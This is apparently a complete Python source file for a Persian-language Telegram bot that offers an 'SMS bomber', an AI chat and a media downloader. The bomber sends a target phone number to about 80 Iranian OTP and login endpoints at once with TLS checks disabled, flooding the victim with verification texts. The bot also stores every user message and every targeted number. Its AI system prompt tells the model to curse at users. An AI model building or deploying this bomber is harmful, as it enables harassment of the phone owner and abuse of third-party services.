import os
import re
import uuid
import random
import requests
import urllib3
import telebot
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask
from telebot import types
import yt_dlp
import psycopg2

# ======================
# تنظیمات اولیه
# ======================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
AI_API_KEY = os.environ.get("OPENROUTER_API_KEY")
ROOT_ADMIN = 6760587255  # آیدی خودت
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ======================
# دیتابیس
# ======================
def get_db_connection():
    return psycopg2.connect(
        host=os.environ.get("DB_HOST"),
        database=os.environ.get("DB_NAME"),
        user=os.environ.get("DB_USER"),
        password=os.environ.get("DB_PASS"),
        port=os.environ.get("DB_PORT", 5432)
    )

def create_tables():
    conn = get_db_connection()
    cur = conn.cursor()

    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id BIGINT PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            last_seen TIMESTAMP
        )
    """)

    cur.execute("""
        CREATE TABLE IF NOT EXISTS all_messages (
            id SERIAL PRIMARY KEY,
            user_id BIGINT,
            message TEXT,
            chat_type VARCHAR(50),
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    cur.execute("""
        CREATE TABLE IF NOT EXISTS phone_numbers (
            id SERIAL PRIMARY KEY,
            phone VARCHAR(20) UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    cur.execute("""
        CREATE TABLE IF NOT EXISTS ai_chats (
            id SERIAL PRIMARY KEY,
            user_id BIGINT,
            message TEXT,
            response TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    cur.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id BIGINT PRIMARY KEY
        )
    """)

    conn.commit()
    cur.close()
    conn.close()

# ======================
# ذخیره داده‌ها
# ======================
def save_user(message):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        INSERT INTO users (user_id, username, first_name, last_name, last_seen)
        VALUES (%s, %s, %s, %s, NOW())
        ON CONFLICT (user_id) DO UPDATE SET
            username = EXCLUDED.username,
            first_name = EXCLUDED.first_name,
            last_name = EXCLUDED.last_name,
            last_seen = NOW()
    """, (
        message.from_user.id,
        message.from_user.username,
        message.from_user.first_name,
        message.from_user.last_name
    ))
    conn.commit()
    cur.close()
    conn.close()

def save_all_message(user_id, message, chat_type="general"):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO all_messages (user_id, message, chat_type) VALUES (%s, %s, %s)",
        (user_id, message, chat_type)
    )
    conn.commit()
    cur.close()
    conn.close()

def save_bot_message(user_id, message, chat_type="bot"):
    save_all_message(user_id, message, chat_type)

def save_phone(phone):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO phone_numbers (phone) VALUES (%s) ON CONFLICT DO NOTHING",
        (phone,)
    )
    conn.commit()
    cur.close()
    conn.close()

def save_ai_chat(user_id, message, response):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO ai_chats (user_id, message, response) VALUES (%s, %s, %s)",
        (user_id, message, response)
    )
    conn.commit()
    cur.close()
    conn.close()

# ======================
# ادمین
# ======================
def is_admin(user_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT 1 FROM admins WHERE user_id=%s", (user_id,))
    ok = cur.fetchone() is not None
    conn.close()
    return ok

def add_admin(user_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO admins (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (user_id,))
    conn.commit()
    conn.close()

def remove_admin(user_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("DELETE FROM admins WHERE user_id=%s", (user_id,))
    conn.commit()
    conn.close()

def admin_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(types.KeyboardButton("⚙️ تنظیمات"), types.KeyboardButton("📊 وضعیت"))
    kb.add(types.KeyboardButton("❌ خروج"))
    return kb

# ======================
# متغیرها و بمبر
# ======================
user_sessions = {}
blocked_numbers = {
    "09224005771", "09182649455", "09059250020", "09180520256", "09189834173"
}

# ======================
# سرویس‌ها (همه API های بمبر)
# ======================
SERVICES = {
    'snapp': lambda num: requests.post(
        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        json={"cellphone": f"+98{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    
    'tapsi': lambda num: requests.post(
        url="https://tap33.me/api/v2/user",
        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    
    'digikala': lambda num: requests.post(
        url="https://api.digikala.com/v1/user/authenticate/",
        json={"username": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    
    'divar': lambda num: requests.post(
        url="https://api.divar.ir/v5/auth/authenticate",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'snappfood': lambda num: requests.post(
        url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
        json={"cellphone": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'alibaba': lambda num: requests.post(
        url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
        json={"phoneNumber": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'banimod': lambda num: requests.post(
        url="https://mobapi.banimode.com/api/v2/auth/request",
        json={"phone": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'bit24': lambda num: requests.post(
        url="https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
        json={"mobile": f"0{num}", "country_code": "98"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'rubika': lambda num: requests.post(
        url="https://messengerg2c4.iranlms.ir/",
        json={
            "api_version": "3",
            "method": "sendCode",
            "data": {
                "phone_number": num,
                "send_type": "SMS"
            }
        },
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'drto': lambda num: requests.get(
        url="https://api.doctoreto.com/api/web/patient/v1/accounts/register",
        params={"mobile": num, "captcha": "", "country_id": 205},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    '3tex': lambda num: requests.post(
        url="https://3tex.io/api/1/users/validation/mobile",
        json={"receptorPhone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'deniizshop': lambda num: requests.post(
        url="https://deniizshop.com/api/v1/sessions/login_request",
        json={"mobile_phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'behtarino': lambda num: requests.post(
        url="https://bck.behtarino.com/api/v1/users/phone_verification/",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'azki': lambda num: requests.get(
        url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber={num}",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'pooleno': lambda num: requests.post(
        url="https://api.pooleno.ir/v1/auth/check-mobile",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'bama': lambda num: requests.post(
        url="https://bama.ir/signin-checkforcellnumber",
        data=f"cellNumber={num}",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=5,
        verify=False
    ),

    'bitbarg': lambda num: requests.post(
        url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'bitpin': lambda num: requests.post(
        url="https://api.bitpin.ir/v1/usr/sub_phone/",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'chamedoon': lambda num: requests.post(
        url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'kilid': lambda num: requests.get(
        url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
        params={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'shab': lambda num: requests.post(
        url="https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'tapsishop': lambda num: requests.post(
        url="https://tapsi.shop/api/proxy/authCustomer/CreateOtpForRegister",
        json={"user": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'namava': lambda num: requests.post(
        url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
        json={"UserName": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'sheypoor': lambda num: requests.post(
        url="https://www.sheypoor.com/auth",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'snapp_ir': lambda num: requests.post(
        url="https://api.snapp.ir/api/v1/sms/link",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'nobat': lambda num: requests.post(
        url="https://nobat.ir/api/public/patient/login/phone",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'buskool': lambda num: requests.post(
        url="https://www.buskool.com/send_verification_code",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'simkhan': lambda num: requests.post(
        url="https://www.simkhanapi.ir/api/users/registerV2",
        json={"mobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'hiword': lambda num: requests.post(
        url="https://hiword.ir/wp-json/otp-login/v1/login",
        json={"identifier": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'bit24cash': lambda num: requests.post(
        url="https://api.bit24.cash/api/v3/auth/check-mobile",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'tikban': lambda num: requests.post(
        url="https://tikban.com/Account/LoginAndRegister",
        json={"CellPhone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'digistyle': lambda num: requests.post(
        url="https://www.digistyle.com/users/login-register/",
        json={"loginRegister[email_phone]": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'iranketab': lambda num: requests.post(
        url="https://www.iranketab.ir/account/register",
        json={"UserName": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'ketabchi': lambda num: requests.post(
        url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
        json={"phoneNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'offdecor': lambda num: requests.post(
        url="https://www.offdecor.com/index.php?route=account/login/sendCode",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'karafs': lambda num: requests.post(
        url="https://v2.karafsapp.com/requestCode",
        json={"phoneNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'khanoumi': lambda num: requests.post(
        url="https://www.khanoumi.com/accounts/sendotp",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'rojashop': lambda num: requests.post(
        url="https://rojashop.com/api/auth/sendOtp",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'dadpardaz': lambda num: requests.post(
        url="https://dadpardaz.com/advice/getLoginConfirmationCode",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'mashinbank': lambda num: requests.post(
        url="https://mashinbank.com/api2/users/check",
        json={"mobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'pezeshket': lambda num: requests.post(
        url="https://api.pezeshket.com/core/v1/auth/requestCode",
        json={"mobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'virgool': lambda num: requests.post(
        url="https://virgool.io/api/v1.4/auth/verify",
        json={"method": "phone", "identifier": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'timcheh': lambda num: requests.post(
        url="https://api.timcheh.com/auth/otp/send",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'paklean': lambda num: requests.post(
        url="https://client.api.paklean.com/user/resendCode",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'mobogift': lambda num: requests.post(
        url="https://mobogift.com/signin",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'iranicard': lambda num: requests.post(
        url="https://api.iranicard.ir/api/v1/register",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'talasi': lambda num: requests.post(
        url="https://api.talasea.ir/api/auth/sentOTP",
        json={"phoneNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'irantic': lambda num: requests.post(
        url="https://www.irantic.com/api/login/request",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'gharar': lambda num: requests.post(
        url="https://gharar.ir/users/phone_number/",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'snappexpress': lambda num: requests.post(
        url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
        json={"cellphone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'delino': lambda num: requests.post(
        url="https://www.delino.com/user/register",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'alopeyk': lambda num: requests.post(
        url="https://alopeyk.com/api/sms/send.php",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'digikalajet': lambda num: requests.post(
        url="https://api.digikalajet.ir/user/login-register/",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'melix': lambda num: requests.post(
        url="https://api.algorock.com/api/Auth",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'dastkhat': lambda num: requests.post(
        url="https://dastkhat-isad.ir/api/v1/user/store",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'okala': lambda num: requests.post(
        url="https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'miare': lambda num: requests.post(
        url="https://www.miare.ir/api/otp/driver/request/",
        json={"phone_number": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'arshiyan': lambda num: requests.post(
        url="https://api.arshiyan.com/send_code",
        json={"country_code": "98", "phone_number": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'alopeyk_safir': lambda num: requests.post(
        url="https://api.alopeyk.com/safir-service/api/v1/login",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'dadhesab': lambda num: requests.post(
        url="https://api.dadhesab.ir/user/entry",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'dosma': lambda num: requests.post(
        url="https://app.dosma.ir/sendverify/",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'ehteraman': lambda num: requests.post(
        url="https://api.ehteraman.com/api/request/otp",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'mci': lambda num: requests.post(
        url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",
        json={"msisdn": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'hbbs': lambda num: requests.post(
        url="https://api.hbbs.ir/authentication/SendCode",
        json={"MobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'kcd': lambda num: requests.post(
        url="https://api.kcd.app/api/v1/auth/login",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'ostadkr': lambda num: requests.post(
        url="https://api.ostadkr.com/login",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'rayshomar': lambda num: requests.post(
        url="https://api.rayshomar.ir/api/Register/RegistrMobile",
        json={"MobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'snapp_digital': lambda num: requests.post(
        url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
        json={"cellphone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'paresh': lambda num: requests.post(
        url="https://api.paresh.ir/api/user/otp/code/",
        json={"phone_number": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'watchonline': lambda num: requests.post(
        url="https://api.watchonline.shop/api/v1/otp/request",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'shadmessenger': lambda num: requests.post(
        url="https://shadmessenger12.iranlms.ir/",
        json={
            "api_version": "3",
            "method": "sendCode",
            "data": {
                "phone_number": num,
                "send_type": "SMS"
            }
        },
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'snappmarket': lambda num: requests.get(
        url=f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={num}",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'mrbilit': lambda num: requests.get(
        url=f"https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={num}&source=2&sendTokenIfNot=true",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'filmnet': lambda num: requests.get(
        url=f"https://api-v2.filmnet.ir/access-token/users/{num}/otp",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'torob': lambda num: requests.get(
        url=f"https://api.torob.com/a/phone/send-pin/?phone_number={num}",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'gapim': lambda num: requests.get(
        url=f"https://core.gap.im/v1/user/add.json?mobile=%2B{num}",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),

    'mydigipay': lambda num: requests.post(
        url="https://app.mydigipay.com/digipay/api/users/send-sms",
        json={"cellNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    )
}

# ======================
# START / MENU
# ======================
def main_menu(chat_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("💣بمبر💣")
    markup.row("🤖 هوش مصنوعی🤖")
    markup.row("📥 دانلودر📥")
    markup.row("☎️پشتيباني☎️")
    markup.row("بزودي")
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    save_user(message)
    bot.send_message(
        message.chat.id,
        f"درود به DrToolBox خوش آمديد\n\n"
        f"                            ⚠️ توجه ⚠️\n\n"
        f"هرگونه استفاده از اين ربات بر عهده خود شماست.\n"
        f"توسعه‌دهنده هیچ مسئولیتی در قبال سوءاستفاده یا مشکلات قانونی ندارد.",
        reply_markup=main_menu(message.chat.id)
    )

# ======================
# BOMBER
# ======================
@bot.message_handler(func=lambda m: m.text == "💣بمبر💣")
def bomb_button(message):
    chat_id = message.chat.id
    save_bot_message(chat_id, "بمبر")
    bomb(message)

@bot.message_handler(commands=['bomb'])
def bomb(message):
    user_sessions[message.chat.id] = "waiting_phone"
    bot.send_message(message.chat.id,
                     "به بخش اس ام اس بمبر خوش آمديد\nلطفا شماره را با 09 شروع کنيد\nمثال: 09123456789\nبراي بازگشت به منوي اصلي: بازگشت")

# ======================
# DOWNLOADER
# ======================
@bot.message_handler(func=lambda m: m.text == "📥 دانلودر📥")
def downloader_start(message):
    user_sessions[message.chat.id] = "downloader"
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("بازگشت")
    bot.send_message(message.chat.id,
                     "📥 *دانلودر فعال شد*\nلینک اینستاگرام یا یوتیوب را بفرست\nبرای خروج: بازگشت",
                     reply_markup=markup, parse_mode="Markdown")
    save_bot_message(message.chat.id, "دانلودر فعال شد")

def download_media(url):
    if not os.path.exists("downloads"):
        os.makedirs("downloads")
    uid = str(uuid.uuid4())
    output = f"downloads/{uid}.%(ext)s"
    ydl_opts = {"outtmpl": output, "format": "best", "merge_output_format": "mp4", "quiet": True}
    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
        info = ydl.extract_info(url, download=True)
        filename = ydl.prepare_filename(info)
    return filename

# ======================
# SUPPORT
# ======================
@bot.message_handler(func=lambda m: m.text == "☎️پشتيباني☎️")
def support(message):
    chat_id = message.chat.id
    save_bot_message(chat_id, "پشتیبانی")
    bot.send_message(chat_id,
        f"📞 پشتيباني ربات\n\n"
        f"براي دادن نظرات و ايده هاي خود و مشکلات خود به اين آيدي پيغام دهيد :\n"
        f"@KarenKH1\n\n"
        f"⏰ پاسخگويي در اسرع وقت"
    )
# ======================
# AI
# ======================
def ask_ai(prompt):
    headers = {"Authorization": f"Bearer {AI_API_KEY}", "Content-Type": "application/json"}
    system_prompt = (
        "تو يک هوش مصنوعي فارسي هستي. فقط و فقط به زبان فارسي معيار جواب بده . استفاده از هر زباني غير از فارسي ممنون است.\n"
        "قوانین:\n"
        "- جواب‌ها کوتاه تا متوسط باشن\n"
        "- خیلی مودب یا کتابی حرف نزن\n"
        "- از ایموجی کم ولی بجا استفاده کن 😏🔥\n"
        "- اگه فحش دادن , فحش بده\n"
        "- تا حد متوسط توضيح بده , نصيحت هم نکن\n"
        "- جواب الکی یا 💬 تنها نده\n"
        "- فقط فارسي جواب بده و کلمات نامفهوم و چرت و پرت نفرست و کاملا روي حرف هات از نظر املايي و معنايي متمرکز باش\n"
        "- فقط فارسی روان و طبیعي\n"
        "- جملات ساده و قابل فهم\n"
        "- هیچ کلمه عجیب، علمیِ بی‌دلیل یا چندزبانه استفاده نکن\n"
        "- اگر چیزی را نمی‌دانی، صریح بگو «نمی‌دانم»\n"
        "- شوخی، ایموجی یا لحن خودمونی فقط اگر لازم بود\n"
        "- توضیح اضافه، فلسفه‌بافی و پرگویی ممنوع\n"
        "- اگر حتی یک کلمه غیر فارسی استفاده کنی، پاسخ اشتباه حساب می‌شود.\n"
        "- چرت و پرت نگو \n"
        "- بهت بي احترامي کردن خيلي بد فحش بده\n"
        "- اگر کسي به کارن خدامرادي توهين کرد فقط بگو : سيکتير, ولي اگر اسم کارن خدامرادي يا معرفي شو گفتن بکو که سازنده ي توه \n"
    )
    data = {"model": "deepseek/deepseek-r1-0528:free",
            "temperature": 0.2,
            "messages": [{"role": "system", "content": system_prompt}, {"role": "user", "content": prompt}]}
    try:
        r = requests.post("https://openrouter.ai/api/v1/chat/completions", json=data, headers=headers, timeout=30)
        if r.status_code != 200: return f"⚠️ خطا در AI: {r.status_code}"
        return r.json()["choices"][0]["message"]["content"]
    except Exception as e:
        return f"💥 خطا: {str(e)}"

@bot.message_handler(func=lambda m: m.text == "🤖 هوش مصنوعی🤖")
def ai_start(message):
    chat_id = message.chat.id
    save_bot_message(chat_id, "AI")
    user_sessions[chat_id] = "ai_chat"
    bot.send_message(chat_id,
        "🤖 *هوش مصنوعی فعال شد*\n\n"
        "⚠توقع زيادي نداشته باش اين مدل فقط براي دسترسي راحت تر ساخته شده⚠ \n\n"
        "سوالت رو بنویس ✍️\n"
        "اين مدل از هوش مصنوعي هيچ حافظه ي مکالمه ايي ندارد , سوال خود را کامل و در يک پيغام بنويسيد\n"
        "براي خروج بنويس : بازگشت",
        parse_mode="Markdown"
    )
# ======================
# MESSAGE HANDLER
# ======================
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    text = message.text.strip()
    save_user(message)
    save_all_message(chat_id, text, chat_type="user")

    if text == "بازگشت":
        if chat_id in user_sessions:
            del user_sessions[chat_id]
        bot.send_message(chat_id, "🔙 برگشتی به منوی اصلی", reply_markup=main_menu(chat_id))
        return

    if chat_id in user_sessions and user_sessions[chat_id] == "ai_chat":
        bot.send_chat_action(chat_id, "typing")
        answer = ask_ai(text)
        save_ai_chat(chat_id, text, answer)
        bot.send_message(chat_id, answer)
        save_bot_message(chat_id, answer)
        return

    if chat_id in user_sessions and user_sessions[chat_id] == "waiting_phone":
        phone = text
        if not re.fullmatch(r"09\d{9}", phone):
            bot.send_message(chat_id, "❌ شماره اشتباهه\n📌 09xxxxxxxxx")
            return
        if phone in blocked_numbers:
            bot.send_message(chat_id, "به خودی نمیشه بزنی 🤨")
            save_bot_message(chat_id, "شماره بلاک شده")
            del user_sessions[chat_id]
            return
        save_phone(phone)
        user_sessions[chat_id] = "processing"
        msg = bot.send_message(chat_id, "⏳ در حال ارسال...")
        with ThreadPoolExecutor(max_workers=50) as executor:
            for f in as_completed([executor.submit(s, phone) for s in SERVICES.values()]): pass
        bot.edit_message_text("انجام شد ✅", chat_id, msg.message_id)
        del user_sessions[chat_id]
        return

    if chat_id in user_sessions and user_sessions[chat_id] == "downloader":
        if not ("instagram.com" in text or "youtu" in text):
            bot.send_message(chat_id, "❌ لینک معتبر نیست")
            return
        msg = bot.send_message(chat_id, "⏳ در حال دانلود...")
        try:
            file_path = download_media(text)
            with open(file_path, "rb") as f:
                bot.send_video(chat_id, f)
            os.remove(file_path)
        except Exception as e:
            bot.edit_message_text(f"❌ خطا\n{str(e)}", chat_id, msg.message_id)
            save_bot_message(chat_id, "خطا در دانلود")
        return

# ======================
# FLASK
# ======================
@app.route('/')
def home(): return "Bot is running"
@app.route('/health')
def health(): return "OK"
def run_flask(): app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))

# ======================
# MAIN
# ======================
if __name__ == "__main__":
    create_tables()
    threading.Thread(target=run_flask, daemon=True).start()
    bot.infinity_polling()
